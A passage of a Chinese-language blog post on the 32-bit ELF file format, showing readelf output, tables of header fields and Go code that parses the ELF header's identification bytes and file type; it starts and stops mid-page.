class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:~/Desktop/share$ readelf -h hello</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  Class:                             ELF32</span><br><span class="line">  Data:                              2&apos;s complement, little endian</span><br><span class="line">  Version:                           1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI Version:                       0</span><br><span class="line">  Type:                              EXEC (Executable file)</span><br><span class="line">  Machine:                           Intel 80386</span><br><span class="line">  Version:                           0x1</span><br><span class="line">  Entry point address:               0x8048310</span><br><span class="line">  Start of program headers:          52 (bytes into file)</span><br><span class="line">  Start of section headers:          6112 (bytes into file)</span><br><span class="line">  Flags:                             0x0</span><br><span class="line">  Size of this header:               52 (bytes)</span><br><span class="line">  Size of program headers:           32 (bytes)</span><br><span class="line">  Number of program headers:         9</span><br><span class="line">  Size of section headers:           40 (bytes)</span><br><span class="line">  Number of section headers:         31</span><br><span class="line">  Section header string table index: 28</span><br><span class="line">  </span><br><span class="line">Elf file type is EXEC (Executable file)</span><br><span class="line">Entry point 0x8048310</span><br><span class="line">There are 9 program headers, starting at offset 52</span><br><span class="line"></span><br><span class="line">Program Headers:</span><br><span class="line">  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align</span><br><span class="line">  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4</span><br><span class="line">  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1</span><br><span class="line">      [Requesting program interpreter: /lib/ld-linux.so.2]</span><br><span class="line">  LOAD           0x000000 0x08048000 0x08048000 0x005c8 0x005c8 R E 0x1000</span><br><span class="line">  LOAD           0x000f08 0x08049f08 0x08049f08 0x00114 0x00118 RW  0x1000</span><br><span class="line">  DYNAMIC        0x000f14 0x08049f14 0x08049f14 0x000e8 0x000e8 RW  0x4</span><br><span class="line">  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4</span><br><span class="line">  GNU_EH_FRAME   0x0004d0 0x080484d0 0x080484d0 0x0002c 0x0002c R   0x4</span><br><span class="line">  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10</span><br><span class="line">  GNU_RELRO      0x000f08 0x08049f08 0x08049f08 0x000f8 0x000f8 R   0x1</span><br><span class="line">  </span><br><span class="line">There are 31 section headers, starting at offset 0x17e0:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000020 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          080481cc 0001cc 000050 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          0804821c 00021c 00004c 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          08048268 000268 00000a 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         08048274 000274 000020 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             08048294 000294 000008 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             0804829c 00029c 000010 08  AI  5  24  4</span><br><span class="line">  [11] .init             PROGBITS        080482ac 0002ac 000023 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        080482d0 0002d0 000030 04  AX  0   0 16</span><br><span class="line">  [13] .plt.got          PROGBITS        08048300 000300 000008 00  AX  0   0  8</span><br><span class="line">  [14] .text             PROGBITS        08048310 000310 000192 00  AX  0   0 16</span><br><span class="line">  [15] .fini             PROGBITS        080484a4 0004a4 000014 00  AX  0   0  4</span><br><span class="line">  [16] .rodata           PROGBITS        080484b8 0004b8 000015 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame_hdr     PROGBITS        080484d0 0004d0 00002c 00   A  0   0  4</span><br><span class="line">  [18] .eh_frame         PROGBITS        080484fc 0004fc 0000cc 00   A  0   0  4</span><br><span class="line">  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4</span><br><span class="line">  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4</span><br><span class="line">  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4</span><br><span class="line">  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4</span><br><span class="line">  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class="line">  [24] .got.plt          PROGBITS        0804a000 001000 000014 04  WA  0   0  4</span><br><span class="line">  [25] .data             PROGBITS        0804a014 001014 000008 00  WA  0   0  4</span><br><span class="line">  [26] .bss              NOBITS          0804a01c 00101c 000004 00  WA  0   0  1</span><br><span class="line">  [27] .comment          PROGBITS        00000000 00101c 000035 01  MS  0   0  1</span><br><span class="line">  [28] .shstrtab         STRTAB          00000000 0016d3 00010a 00      0   0  1</span><br><span class="line">  [29] .symtab           SYMTAB          00000000 001054 000450 10     30  47  4</span><br><span class="line">  [30] .strtab           STRTAB          00000000 0014a4 00022f 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br></pre></td></tr></table></figure>

<p>我实现的效果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">There are 31 section headers, starting at offset 0x17e0:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000020 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          080481cc 0001cc 000050 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          0804821c 00021c 00004c 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          08048268 000268 00000a 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         08048274 000274 000020 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             08048294 000294 000008 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             0804829c 00029c 000010 08  AI  5  24  4</span><br><span class="line">  [11] .init             PROGBITS        080482ac 0002ac 000023 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        080482d0 0002d0 000030 04  AX  0   0 16</span><br><span class="line">  [13] .plt.got          PROGBITS        08048300 000300 000008 00  AX  0   0  8</span><br><span class="line">  [14] .text             PROGBITS        08048310 000310 000192 00  AX  0   0 16</span><br><span class="line">  [15] .fini             PROGBITS        080484a4 0004a4 000014 00  AX  0   0  4</span><br><span class="line">  [16] .rodata           PROGBITS        080484b8 0004b8 000015 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame_hdr     PROGBITS        080484d0 0004d0 00002c 00   A  0   0  4</span><br><span class="line">  [18] .eh_frame         PROGBITS        080484fc 0004fc 0000cc 00   A  0   0  4</span><br><span class="line">  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4</span><br><span class="line">  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4</span><br><span class="line">  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4</span><br><span class="line">  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4</span><br><span class="line">  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class="line">  [24] .got.plt          PROGBITS        0804a000 001000 000014 04  WA  0   0  4</span><br><span class="line">  [25] .data             PROGBITS        0804a014 001014 000008 00  WA  0   0  4</span><br><span class="line">  [26] .bss              NOBITS          0804a01c 00101c 000004 00  WA  0   0  1</span><br><span class="line">  [27] .comment          PROGBITS        00000000 00101c 000035 01  MS  0   0  1</span><br><span class="line">  [28] .shstrtab         STRTAB          00000000 0016d3 00010a 00      0   0  1</span><br><span class="line">  [29] .symtab           SYMTAB          00000000 001054 000450 10     30  47  4</span><br><span class="line">  [30] .strtab           STRTAB          00000000 0014a4 00022f 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br></pre></td></tr></table></figure>

<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>首先在解析之前， 必须对数据类型格式声明一下</p>
<table>
<thead>
<tr>
<th align="center">名称</th>
<th align="center">大小（byte）</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Elf32_Addr</td>
<td align="center">4</td>
<td align="center">无符号程序地址</td>
</tr>
<tr>
<td align="center">Elf32_Half</td>
<td align="center">2</td>
<td align="center">无符号中等整数</td>
</tr>
<tr>
<td align="center">Elf32_Off</td>
<td align="center">4</td>
<td align="center">无符号文件偏移</td>
</tr>
<tr>
<td align="center">Elf32_SWord</td>
<td align="center">4</td>
<td align="center">有符号大整数</td>
</tr>
<tr>
<td align="center">Elf32_Word</td>
<td align="center">4</td>
<td align="center">无符号大整数</td>
</tr>
<tr>
<td align="center">unsigned char</td>
<td align="center">1</td>
<td align="center">无符号笑整数</td>
</tr>
</tbody></table>
<p>我在Go语言里面如此定义：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> EI_NIDENT = <span class="number">16</span></span><br><span class="line"><span class="keyword">type</span> Elf32_Addr = <span class="keyword">uint32</span>	<span class="comment">//4个字节</span></span><br><span class="line"><span class="keyword">type</span> Elf32_Half = <span class="keyword">uint16</span>	<span class="comment">//2个字节</span></span><br><span class="line"><span class="keyword">type</span> Elf32_Off = <span class="keyword">uint32</span>		<span class="comment">//4个字节</span></span><br><span class="line"><span class="keyword">type</span> Elf32_SWord = <span class="keyword">int32</span>	<span class="comment">//4个字节</span></span><br><span class="line"><span class="keyword">type</span> Elf32_Word = <span class="keyword">uint32</span>	<span class="comment">//4个字节</span></span><br><span class="line"><span class="keyword">type</span> u_char = <span class="keyword">byte</span>	<span class="comment">//1个字节（uint8)</span></span><br></pre></td></tr></table></figure>

<p>一个ELF文件可以被标记为一下几种类型：</p>
<ul>
<li>ET_NONE：未知类型。这个标记表明文件类型不确定，或者还未定义</li>
<li>ET_REL：重定位文件。ELF类型标记为relocatable意味着该文件被标记为了一段可重定位的代码，有时也称为目标文件。可重定位目标文件通常是还未被链接到可执行程序的一段位置独立的代码（position independent code）。在编译完代码之后通常可以看到一个.o格式的文件，这种文件包含了创建可执行文件所需要的代码和数据</li>
<li>ET_EXEC：可执行文件。ELF类型为executable，表明这个文件被标记为可执行文件。这种类型的文件也称为程序，是一个进程开始执行的入口</li>
<li>ET_DYN：共享目标文件。ELF类型为dynamic，意味着该文件被标记为了一个动态的可链接的目标文件，也称为共享库。这类共享库会在程序运行时被装载并链接到程序的进程镜像中</li>
<li>ET_CORE：核心文件。在程序崩溃或者进程传递了一个SIGSEGV信号（分段违规）时，会在核心文件中记录整个进程的镜像信息。可以使用GDB读取这类文件来辅助调试并查找程序崩溃的原因</li>
</ul>
<p>对于一个ELF文件主要由以下这几个部分组成：</p>
<ul>
<li><p>ELF Header：<strong>ELF头部</strong>。每个ELF文件都必须存在一个ELF_Header,这里存放了很多重要的信息用来描述整个文件的组织,如: 版本信息,入口信息,偏移信息等。程序执行也必须依靠其提供的信息</p>
</li>
<li><p>Program Header Table：<strong>程序头部表。</strong>可选的一个表，用于告诉系统如何在内存中创建映像,在图中也可以看出来,有程序头部表才有段,有段就必须有程序头部表。其中存放各个段的基本信息(包括地址指针)</p>
</li>
<li><p>Section Header Table：<strong>节区头部表</strong>。类似与Program_Header_Table,但与其相对应的是节区(Section)</p>
</li>
<li><p>Section：<strong>节区</strong>。将文件分成一个个节区，每个节区都有其对应的功能，如符号表，哈希表等</p>
</li>
<li><p>Segment：<strong>段</strong>。就是将文件分成一段一段映射到内存中。段中通常包括一个或多个节区</p>
</li>
</ul>
<blockquote>
<p>每个节区都应该是前后相连的，且不可有重叠。即在一个地址上的字节只能属于一个节区</p>
</blockquote>
<h2 id="ELF-Header"><a href="#ELF-Header" class="headerlink" title="ELF Header"></a>ELF Header</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p>首先我们得先熟悉并且理解ELF Header的结构体定义开始：</p>
<table>
<thead>
<tr>
<th align="center">名称</th>
<th align="center">类型</th>
</tr>
</thead>
<tbody><tr>
<td align="center">e_ident[EI_NIDENT]</td>
<td align="center">unsigned char</td>
</tr>
<tr>
<td align="center">e_type</td>
<td align="center">Elf32_Half</td>
</tr>
<tr>
<td align="center">e_machine</td>
<td align="center">Elf32_Half</td>
</tr>
<tr>
<td align="center">e_version</td>
<td align="center">Elf32_Word</td>
</tr>
<tr>
<td align="center">e_entry</td>
<td align="center">Elf32_Addr</td>
</tr>
<tr>
<td align="center">e_phoff</td>
<td align="center">Elf32_Off</td>
</tr>
<tr>
<td align="center">e_shoff</td>
<td align="center">Elf32_Off</td>
</tr>
<tr>
<td align="center">e_flags</td>
<td align="center">Elf32_Word</td>
</tr>
<tr>
<td align="center">e_ehsize</td>
<td align="center">Elf32_Half</td>
</tr>
<tr>
<td align="center">e_phentsize</td>
<td align="center">Elf32_Half</td>
</tr>
<tr>
<td align="center">e_phnum</td>
<td align="center">Elf32_Half</td>
</tr>
<tr>
<td align="center">e_shentsize</td>
<td align="center">Elf32_Half</td>
</tr>
<tr>
<td align="center">e_shnum</td>
<td align="center">Elf32_Half</td>
</tr>
<tr>
<td align="center">e_shstrndx</td>
<td align="center">Elf32_Half</td>
</tr>
</tbody></table>
<p>最后程序中的样子，对于e_ident我做一了点修改为了方便后续程序编写：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Elf32_Ehdr <span class="keyword">struct</span> &#123;</span><br><span class="line">	<span class="comment">//e_ident [EI_NIDENT]u_char</span></span><br><span class="line">	Ehdr_Magic <span class="keyword">string</span></span><br><span class="line">	Ehdr_Class <span class="keyword">int</span></span><br><span class="line">	Ehdr_Data <span class="keyword">int</span></span><br><span class="line">	Ehdr_Version <span class="keyword">int</span></span><br><span class="line">	Ehdr_OS <span class="keyword">int</span></span><br><span class="line">	Ehdr_ABIV <span class="keyword">int</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	e_ident 这是一个数组,其每个字节又都有所代表的含义</span></span><br><span class="line"><span class="comment">	EI_MAG0 - EI_MAG3 文件标识就是平时所说的ELF头</span></span><br><span class="line"><span class="comment">	EI_CLASS 文件类,其实代表的是32位/64位程序</span></span><br><span class="line"><span class="comment">	EI_DATA 数据编码,一般都是01[td]</span></span><br><span class="line"><span class="comment">	EI_VERSION 文件版本,固定值01 EV_CURRENT</span></span><br><span class="line"><span class="comment">	EI_PAD 呃…就是一堆全是00的用来补全大小的数组</span></span><br><span class="line"><span class="comment">	EI_NIDENT 说是e_ident数组的大小,但我看了好几个so都是00</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	e_type Elf32_Half</span><br><span class="line">	<span class="comment">//标识文件类型</span></span><br><span class="line">	e_machine Elf32_Half</span><br><span class="line">	<span class="comment">//声明ABI</span></span><br><span class="line">	e_version Elf32_Word</span><br><span class="line">	<span class="comment">//跟ident[]里的EI_VERSION一样,为01</span></span><br><span class="line">	e_entry Elf32_Addr</span><br><span class="line">	<span class="comment">//可执行程序入口点地址</span></span><br><span class="line">	e_phoff Elf32_Off</span><br><span class="line">	<span class="comment">//Program Header Offset,程序头部表索引地址,没有则为0</span></span><br><span class="line">	e_shoff Elf32_Off</span><br><span class="line">	<span class="comment">//Section Header Offset,节区表索引地址,没有则为0</span></span><br><span class="line">	e_flags Elf32_Word</span><br><span class="line">	<span class="comment">//保存与文件相关的，特定于处理器的标志。</span></span><br><span class="line">	e_ehsize Elf32_Half</span><br><span class="line">	<span class="comment">//ELF_Header Size,ELF头部的大小</span></span><br><span class="line">	e_phentsize Elf32_Half</span><br><span class="line">	<span class="comment">//程序头部表的单个表项的大小</span></span><br><span class="line">	e_phnum Elf32_Half</span><br><span class="line">	<span class="comment">//程序头部表的表项数</span></span><br><span class="line">	e_shentsize Elf32_Half</span><br><span class="line">	<span class="comment">//节区表的单个表项的大小</span></span><br><span class="line">	e_shnum Elf32_Half</span><br><span class="line">	<span class="comment">//节区表的表项数</span></span><br><span class="line">	e_shstrndx Elf32_Half</span><br><span class="line">	<span class="comment">//String Table Index,在节区表中有一个存储各节区名称的节区,这里表示名称表在第几个节区。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面开始逐步解释各个字段</p>
<h4 id="e-ident"><a href="#e-ident" class="headerlink" title="e_ident"></a>e_ident</h4><p><strong>目标文件标识</strong>。详细描述该二进制文件对应的体系结构，其每个字节又都有所代表的含义，包括对应的字长，CPU架构，大小端</p>
<h5 id="EI-MAG0-EI-MAG3（文件标识）"><a href="#EI-MAG0-EI-MAG3（文件标识）" class="headerlink" title="EI_MAG0 - EI_MAG3（文件标识）"></a>EI_MAG0 - EI_MAG3（文件标识）</h5><p>默认值就是：7F 45 4C 46，即ELF</p>
<h5 id="EI-CLASS（文件类）"><a href="#EI-CLASS（文件类）" class="headerlink" title="EI_CLASS（文件类）"></a>EI_CLASS（文件类）</h5><table>
<thead>
<tr>
<th align="center">取值</th>
<th align="center">代表</th>
<th align="center">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">01</td>
<td align="center">ELFCLASS32</td>
<td align="center">32位程序</td>
</tr>
<tr>
<td align="center">02</td>
<td align="center">ELFCLASS64</td>
<td align="center">64位程序</td>
</tr>
</tbody></table>
<p>Go代码：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EhdrClass := <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>&#123;</span><br><span class="line">		<span class="number">1</span>: <span class="string">"ELF32"</span>,</span><br><span class="line">		<span class="number">2</span>: <span class="string">"ELF64"</span>,</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h5 id="EI-DATA（数据编码）"><a href="#EI-DATA（数据编码）" class="headerlink" title="EI_DATA（数据编码）"></a>EI_DATA（数据编码）</h5><table>
<thead>
<tr>
<th align="center">取值</th>
<th align="center">代表</th>
<th align="center">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">01</td>
<td align="center">ELFDATA2LSB</td>
<td align="center">小端序</td>
</tr>
<tr>
<td align="center">02</td>
<td align="center">ELFDATA2MSB</td>
<td align="center">大端序</td>
</tr>
</tbody></table>
<p>Go代码：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EhdrData := <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>&#123;</span><br><span class="line">		<span class="number">1</span>:<span class="string">"2's complement, little endian"</span>,</span><br><span class="line">		<span class="number">2</span>:<span class="string">"2's complement, big endian"</span>,</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h5 id="EI-VERSION-文件版本"><a href="#EI-VERSION-文件版本" class="headerlink" title="EI_VERSION(文件版本)"></a>EI_VERSION(文件版本)</h5><p>固定值01 <strong>EV_CURRENT</strong></p>
<p>Go代码：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EhdrVersion := <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>&#123;</span><br><span class="line">		<span class="number">1</span>:<span class="string">"1 (current)"</span>,</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h5 id="EI-OSABI-OS类型"><a href="#EI-OSABI-OS类型" class="headerlink" title="EI_OSABI(OS类型)"></a>EI_OSABI(OS类型)</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">EhdrOSABI := <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>&#123;</span><br><span class="line">		<span class="number">0x0</span> : <span class="string">"UNIX - System V"</span>,</span><br><span class="line">		<span class="number">0x1</span> : <span class="string">"Hewlett-Packard HP-UX"</span>,</span><br><span class="line">		<span class="number">0x2</span> : <span class="string">"NetBSD"</span>,</span><br><span class="line">		<span class="number">0x3</span> : <span class="string">"Linux"</span>,</span><br><span class="line">		<span class="number">0x6</span> : <span class="string">"Sun Solaris"</span>,</span><br><span class="line">		<span class="number">0x7</span> : <span class="string">"AIX"</span>,</span><br><span class="line">		<span class="number">0x8</span> : <span class="string">"IRIX"</span>,</span><br><span class="line">		<span class="number">0x9</span> : <span class="string">"FreeBSD"</span>,</span><br><span class="line">		<span class="number">0xA</span> : <span class="string">"Compaq TRU64 UNIX"</span>,</span><br><span class="line">		<span class="number">0xB</span> : <span class="string">"Novell Modesto"</span>,</span><br><span class="line">		<span class="number">0xC</span> : <span class="string">"Open BSD"</span>,</span><br><span class="line">		<span class="number">0xD</span> : <span class="string">"Open VMS"</span>,</span><br><span class="line">		<span class="number">0xE</span> : <span class="string">"Hewlett-Packard Non-Stop Kernel"</span>,</span><br><span class="line">		<span class="number">0xF</span> : <span class="string">"Amiga Research OS"</span>,</span><br><span class="line">		<span class="number">0x40</span>: <span class="string">"ARM EABI"</span>,</span><br><span class="line">		<span class="number">0x61</span>: <span class="string">"ARM"</span>,</span><br><span class="line">		<span class="number">0xFF</span>: <span class="string">"Standalone (embedded applications)"</span>,</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h5 id="EI-ABIVERSION"><a href="#EI-ABIVERSION" class="headerlink" title="EI_ABIVERSION"></a>EI_ABIVERSION</h5><p>ABI版本</p>
<h5 id="EI-PAD"><a href="#EI-PAD" class="headerlink" title="EI_PAD"></a>EI_PAD</h5><p>为保留字节的开始，默认为0</p>
<h5 id="EI-NIDENT"><a href="#EI-NIDENT" class="headerlink" title="EI_NIDENT"></a>EI_NIDENT</h5><p>e_ident数组的大小，但一般默认值为0</p>
<p>最后可以得到解析e_ident的代码：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(Ehdr Elf32_Ehdr)</span> <span class="title">ReadMagic</span><span class="params">(data []<span class="keyword">byte</span>)</span><span class="title">Elf32_Ehdr</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> MagicNum = data[:<span class="number">16</span>]</span><br><span class="line">	<span class="comment">//Ehdr.e_ident = u_char(MagicNum)</span></span><br><span class="line">	<span class="keyword">for</span> _,value := <span class="keyword">range</span> MagicNum&#123;</span><br><span class="line">		Ehdr.Ehdr_Magic += Change.DecHex(<span class="keyword">int64</span>(value))</span><br><span class="line">		Ehdr.Ehdr_Magic += <span class="string">" "</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//Ehdr_Class</span></span><br><span class="line">	Ehdr.Ehdr_Class = <span class="keyword">int</span>(MagicNum[<span class="number">4</span>])</span><br><span class="line">	<span class="comment">//Ehdr_Data</span></span><br><span class="line">	Ehdr.Ehdr_Data = <span class="keyword">int</span>(MagicNum[<span class="number">5</span>])</span><br><span class="line">	<span class="comment">//Ehdr_Version</span></span><br><span class="line">	Ehdr.Ehdr_Version = <span class="keyword">int</span>(MagicNum[<span class="number">6</span>])</span><br><span class="line">	<span class="comment">//Ehdr_OS</span></span><br><span class="line">	Ehdr.Ehdr_OS = <span class="keyword">int</span>(MagicNum[<span class="number">7</span>])</span><br><span class="line">	<span class="comment">//Ehdr_ABIV</span></span><br><span class="line">	Ehdr.Ehdr_ABIV = <span class="keyword">int</span>(MagicNum[<span class="number">8</span>])</span><br><span class="line">	<span class="keyword">return</span> Ehdr</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="e-type"><a href="#e-type" class="headerlink" title="e_type"></a>e_type</h4><p>目标文件类型</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">EhdrType := <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">string</span>&#123;</span><br><span class="line">		<span class="number">0x0</span> : <span class="string">"NONE"</span>,<span class="comment">//No file type</span></span><br><span class="line">		<span class="number">0x1</span> : <span class="string">"REL"</span>,<span class="comment">//Relocatable</span></span><br><span class="line">		<span class="number">0x2</span> : <span class="string">"EXEC"</span>,<span class="comment">//Executable</span></span><br><span class="line">		<span class="number">0x3</span> : <span class="string">"DYN"</span>,<span class="comment">//Shared object</span></span><br><span class="line">		<span class="number">0x4</span> : <span class="string">"CORE"</span>,<span class="comment">//Core</span></span><br><span class="line">		<span class="number">0xfe00</span> : <span class="string">"LOOS"</span>,<span class="comment">//OS specific</span></span><br><span class="line">		<span class="number">0xfeff</span> : <span 